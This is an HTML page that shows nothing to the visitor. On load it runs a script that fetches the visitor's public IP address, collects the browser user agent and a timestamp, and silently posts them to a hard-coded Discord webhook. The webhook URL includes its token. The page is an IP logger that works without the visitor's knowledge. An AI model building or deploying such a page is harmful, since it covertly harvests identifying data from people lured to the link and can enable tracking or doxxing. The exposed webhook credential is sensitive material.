<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>...</title>
</head>
<body>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1474171731320115314/K1ZIVm53yR5pu8Ghf93U4BpDCQqVM7eFxdBtx4KgfB5TKym9zrF8kBEmNWzn68dzv2hp";

(async function() {
  let ip = "unknown";

  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ip = data.ip;
  } catch (e) {
    console.log("ip fetch failed", e);
  }

  const time = new Date().toISOString()
    .replace("T", " ")
    .slice(0, 19) + " UTC";

  const ua = navigator.userAgent.slice(0, 200)
    .replace(/"/g, "'");   // escape quotes just in case

  const message = `Visitor • ${time} • IP: ${ip} • UA: ${ua}`;

  const payload = {
    content: message
  };

  try {
    await fetch(WEBHOOK, {
      method: "POST",
      mode: "no-cors",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
    console.log("sent (check discord)");
  } catch (err) {
    console.error("fetch error:", err);
  }
})();
</script>

</body>
</html>
